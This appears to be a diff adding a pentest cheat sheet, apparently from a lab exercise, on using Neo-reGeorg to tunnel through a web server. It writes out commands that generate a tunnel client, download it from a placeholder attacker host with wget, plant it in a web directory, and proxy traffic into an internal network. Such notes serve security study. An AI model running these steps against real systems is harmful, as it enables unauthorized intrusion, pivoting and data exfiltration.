@@ -1,0 +1,21 @@
+Neo-reGeorg - lets us establish a communication channel to access the internal network devices
+Source: https://github.com/L-codes/Neo-reGeorg
+
+HTTP Tunneling for data exfiltration:
+  python3 neoreg.py generate -k thm          To create an HTTP tunnel communication channel and pivot into the internal network 
+                                             and communicate with local network devices through HTTP protocol, we need to
+                                             generate an encrypted tunneling client file and upload it to the webserver machine that connects to WAN.
+                                             The command above creates a client with the `thm` key in the `neoreg_servers/` directory
+  python3 -m http.server
+	wget http://<ATTACKER_IP>:8000/tunnel.php -O tunnel.php
+	move .\tunnel.php C:\var\www\data\tunnel.php
+                                             Upload the tunnel.php file into the web server directory
+  python3 neoreg.py generate -k thm -u http://MACHINE_IP/uploader/files/tunnel.php
+                                             Once it's uploaded, we can access it on the following URL: http://MACHINE_IP/uploader/files/tunnel.php.
+                                             Use this command to connect to the client and provide the key to decrypt the tunneling client. Once it is
+                                             connected to the tunneling client, we are ready to use the tunnel connection as a proxy binds on our local
+                                             machine, `127.0.0.1`, on port `1080`.
+  curl --socks5 127.0.0.1:1080 http://172.20.0.121:80
+                                             If we want to access the internal machine, which has an internal IP address `172.20.0.121` on port
+                                             `80`, we can use the `curl` command with `--socks5` argument. We can also use other proxy applications,
+                                             such as `ProxyChains`, `FoxyProxy`, etc., to communicate with the internal network. 
